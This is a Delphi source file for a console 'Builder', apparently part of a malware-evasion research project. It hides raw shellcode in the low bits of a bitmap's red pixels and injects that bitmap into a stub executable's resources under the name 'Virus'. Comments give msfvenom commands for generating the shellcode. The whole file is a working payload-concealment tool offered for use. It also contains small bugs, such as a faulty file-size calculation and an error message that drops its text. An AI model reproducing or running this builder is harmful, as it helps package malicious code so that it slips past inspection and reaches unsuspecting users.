{******************************************************************************}
{                                                                              }
{                                                                              }
{                   Author: DarkCoderSc (Jean-Pierre LESUEUR)                  }
{                   https://www.twitter.com/darkcodersc                        }
{                   https://www.unprotect.it/                                  }
{                   https://github.com/Unprotect-Project                       }
{                   https://github.com/darkcodersc                             }
{                   https://github.com/PhrozenIO                               }
{                   License: Apache License 2.0                                }
{                                                                              }
{                                                                              }
{******************************************************************************}

program Builder;

{$APPTYPE CONSOLE}

{$R *.res}

uses
  System.SysUtils,
  System.Classes,
  System.Math,
  Winapi.Windows,
  Winapi.CommDlg,
  uExceptions in '..\Shared\uExceptions.pas',
  uFunctions in '..\Shared\uFunctions.pas';

(* Local Functions *)

{ _.OpenFileDialog }
function OpenFileDialog(var AFileName : String; const ATitle : String; const AFilter : String): Boolean;
var AOpenFileName : OPENFILENAMEW;
    ABuffer       : array[0..MAX_PATH-1] of WideChar;
begin
  result := False;
  ///

  WriteLn(ATitle + ':');

  ZeroMemory(@AOpenFileName, SizeOf(OPENFILENAMEW));
  FillChar(ABuffer, Length(ABuffer) * SizeOf(WideChar), #0);

  AOpenFileName.lStructSize := SizeOf(OPENFILENAMEW);
  AOpenFileName.hWndOwner := 0;
  AOpenFileName.lpstrTitle := PWideChar(ATitle);
  AOpenFileName.lpstrFilter := PWideChar(AFilter);
  AOpenFileName.nFilterIndex := 1;
  AOpenFileName.Flags := (OFN_FILEMUSTEXIST or OFN_PATHMUSTEXIST);
  AOpenFileName.lpstrFile := @ABuffer[0];
  AOpenFileName.nMaxFile := MAX_PATH;

  if not GetOpenFileNameW(AOpenFileName) then begin
    if GetLastError() = 0 then
      Exit();
    ///

    raise EWindowsException.Create('GetOpenFileNameW');
  end;

  AFileName := ABuffer;

  WriteLn(Format('Using: "%s"', [AFileName]));

  ///
  result := True;
end;

{ _.GetFileSize }
function GetFileSize(const AFileName : String) : UInt64;
var AFileInfo : TWin32FileAttributeData;
begin
  result := 0;
  ///

  if NOT FileExists(AFileName) then
    Exit();

  if NOT GetFileAttributesEx(PWideChar(AFileName), GetFileExInfoStandard, @AFileInfo) then
    Exit();

  ///
  result := UInt64(AFileInfo.nFileSizeLow) or UInt64(AFileInfo.nFileSizeHigh shl 32);
end;

{ _.ReadFileContent }
procedure ReadFileContent(const AFileName : String; var pBuffer : Pointer; var ABufferSize : UInt64);
const CHUNK_SIZE = 4096;
begin
  ABufferSize := 0;
  pBuffer := nil;
  ///

  if not FileExists(AFileName) then
    Exit();


  var hFile : THandle := CreateFileW(PWideChar(AFileName), GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
  if hFile = INVALID_HANDLE_VALUE then
    raise EWindowsException.Create('CreateFileW');
  try
    ABufferSize := GetFileSize(AFileName);
    ///

    GetMem(pBuffer, ABufferSize);

    var ABytesRead : DWORD;
    var AOffset : UInt64 := 0;
    repeat
      if not ReadFile(hFile, PByte(NativeUInt(pBuffer) + AOffset)^, CHUNK_SIZE, ABytesRead, 0) then
        break;

      ///
      Inc(AOffset, ABytesRead);
    until ABytesRead = 0;

  finally
    CloseHandle(hFile);
  end;
end;

(* Entry Point *)

const RES_NAME = 'Virus';

begin
  try
    { Open Target Stub }
    var AStubFile : String;
    if not OpenFileDialog(AStubFile, 'Select Stub File', 'Executable Files (*.exe)'+ #0 + '*.exe' + #0) then
      ExitProcess(1);
    ///

    var ACPU : String;
    {$IFDEF WIN64}
      ACPU := 'x64';
    {$ELSE}
      ACPU := 'x32';
    {$ENDIF}

    { Open Target Shellcode }
    // Example of Shellcode for Windows:
    // --> msfvenom -a x86 --platform Windows -p windows/exec CMD="calc.exe" EXITFUNC=thread -f raw > payload_x32.bin
    // --> msfvenom -a x64 --platform Windows -p windows/x64/exec CMD="calc.exe" EXITFUNC=thread -f raw > payload_x64.bin
    var AShellcodeFile : String;
    if not OpenFileDialog(AShellcodeFile, Format('Select %s Shellcode File', [ACPU]), 'Binary File (*.bin)'+ #0 + '*.bin' + #0) then
      ExitProcess(2);
    ///

    {TODO -oDarkCoderSc -cGeneral : Check Stub File Matching Architecture}

    { Open Target Bitmap }
    var ABitmapFile : String;
    if not OpenFileDialog(ABitmapFile, 'Select Bitmap File', 'Bitmap File (*.bmp)'+ #0 + '*.bmp' + #0) then
      ExitProcess(3);
    ///

    var pBitmap : Pointer := nil;
    var ABitmapSize : UInt64;
    var pPayload : Pointer := nil;
    var APayloadSize : UInt64;
    try
      // Read bitmap file content and store to memory.
      ReadFileContent(ABitmapFile, pBitmap, ABitmapSize);
      if not Assigned(pBitmap) then
        raise Exception.Create('Could not Read Bitmap File.');

      // Read shellcode payload file content and store to memory.
      ReadFileContent(AShellcodeFile, pPayload, APayloadSize);
      if not Assigned(pPayload) then
        raise Exception.Create('Could not Read Shellcode File.');

      var pBitmapHeader : PBitmapInfoHeader := pBitmap;
      const BITMAP_MAGIC = $4d42;

      // Check if we are dealing with a Bitmap File or DIB
      var ASizeOfBitmapHeaderToIgnore := 0;
      if CompareMem(pBitmap, @BITMAP_MAGIC, 2) then begin
        pBitmapHeader := Pointer(NativeUInt(pBitmap) + SizeOf(TBitmapFileHeader));

        ///
        ASizeOfBitmapHeaderToIgnore := SizeOf(TBitmapFileHeader);
      end;

      if (pBitmapHeader^.biBitCount <> 24) and (pBitmapHeader^.biBitCount <> 32) then
        raise Exception.Create('Unsupported Bitmap Format. Must be 24-bit or 32-bit.');

      WriteLn(Format('@Shellcode Dump (%s):', [FormatSize(APayloadSize)]));
      WriteLn(BufferToHexView(pPayload, APayloadSize));
      WriteLn('---');

      // Binary length of data to be hidden in the image
      var AEncodedPayloadSize : UInt64 := (APayloadSize + SizeOf(UInt64)) * 8;

      // Check if Bitmap file is big enough to host our encoded payload
      if (pBitmapHeader^.biWidth * pBitmapHeader^.biHeight < AEncodedPayloadSize) then
        raise Exception.Create(
          Format('Bitmap is to small to host our shellcode, please use a ' +
                 'bigger bitmap image. Bitmap minimum estimated size: %s', [
            FormatSize((AEncodedPayloadSize * 8) + ASizeOfBitmapHeaderToIgnore + SizeOf(TBitmapInfoHeader))
          ])
        );

      //
      // Encode Shellcode Size (UInt64) + Shellcode (Raw)
      //

      WriteLn('Encode Shellcode as Binary Stream...');

      var AEncodedPayload : array of byte;
      SetLength(AEncodedPayload, AEncodedPayloadSize);

      var ACursor : UInt64 := 0;

      // Encode the size of our payload as binary
      for var I := (SizeOf(UInt64) * 8) -1 downto 0 do
        AEncodedPayload[ACursor + I] := (APayloadSize shr I) and 1;

      Inc(ACursor, SizeOf(UInt64) * 8);

      // Encode our payload as binary (Byte by Byte)
      var pByte_ : PByte := pPayload;
      repeat
        for var I := (SizeOf(Byte) * 8) -1 downto 0 do
          AEncodedPayload[ACursor + I] := (pByte_^ shr I) and 1;

        Inc(ACursor, SizeOf(Byte) * 8);
        Inc(pByte_);
      until NativeUInt(pByte_) = (NativeUInt(pPayload) + APayloadSize);

      WriteLn('Hide Encoded Shellcode in Host Bitmap Red Pixels...');

      ACursor := 0;
      var ABreak := False;
      var pRow : PByte := Pointer(NativeUInt(pBitmapHeader) + SizeOf(TBitmapInfoHeader));

      for var Y := 0 to pBitmapHeader^.biHeight -1 do begin
        for var X := 0 to pBitmapHeader^.biWidth -1 do begin
          // A brief explanation: Typically, we use the RGBTriple structure for 24-bit
          // bitmap images and RGBQuad for 32-bit bitmap images. However, if we don't
          // need to consider the alpha value in a 32-bit bitmap, we can streamline our
          // code by using RGBTriple for both 32-bit and 24-bit bitmaps. We just need
          // to ensure that we correctly increment our pixel row based on the bitmap's
          // bit-depth. This optimization simplifies our code, but it's essential to
          // note that if we were using alpha for transparency, we would need to use
          // the appropriate pixel structure based on the bitmap's pixel format.
          var pPixel := PRGBTriple(NativeUInt(pRow) + (X * SizeOf(TRGBTriple)));

          // If bit is set to 1, make current red value odd otherwise we make it
          // even.
          if AEncodedPayload[ACursor] = 1 then
            pPixel^.rgbtRed := pPixel^.rgbtRed or 1       // Turn it `odd`
          else
            pPixel^.rgbtRed := pPixel^.rgbtRed and not 1; // Turn it `even`

          ///
          Inc(ACursor);
          if ACursor = Length(AEncodedPayload) then begin
            ABreak := True;
            break;
          end;
        end;

        if ABreak then
          break;

        ///
        Inc(pRow, pBitmapHeader^.biWidth * (pBitmapHeader^.biBitCount div 8));
      end;

      //
      // Store in stub resource infected image
      //

      WriteLn('Inject Bitmap in Stub Resources(RT_BITMAP)...');

      // https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-beginupdateresourcew?WT_mc_id=SEC-MVP-5005282
      var ADiscard := True;
      var hResource : THandle := BeginUpdateResourceW(PWideChar(AStubFile), False);
      if hResource = 0 then
        raise EWindowsException.Create('BeginUpdateResourceW');
      try
        // https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-updateresourcew?WT_mc_id=SEC-MVP-5005282
        if not UpdateResourceW(
                                hResource,
                                RT_BITMAP,
                                PWideChar(RES_NAME),
                                LANG_SYSTEM_DEFAULT,
                                // Do not copy the "Optional" Bitmap Header to become DIB (Device-Independent Bitmap)
                                // and readable by software like Resource Hacker.
                                PByte(NativeUInt(pBitmap) + ASizeOfBitmapHeaderToIgnore),
                                (ABitmapSize - ASizeOfBitmapHeaderToIgnore)
        ) then
          raise EWindowsException.Create('UpdateResourceW');

        ///
        ADiscard := False;
      finally
        // https://learn.microsoft.com/fr-fr/windows/win32/api/winbase/nf-winbase-endupdateresourcew?WT_mc_id=SEC-MVP-5005282
        if not EndUpdateResourceW(hResource, ADiscard) then
          raise EWindowsException.Create('EndUpdateResourceW');
     end;
    finally
      if Assigned(pPayload) then
        FreeMem(pPayload, APayloadSize);

      if Assigned(pBitmap) then
        FreeMem(pBitmap, ABitmapSize);
    end;

    ///
    WriteLn('Enjoy ;-)');
  except
    on E: Exception do
      Writeln(Format('Error: ', [E.Message]));
  end;
end.
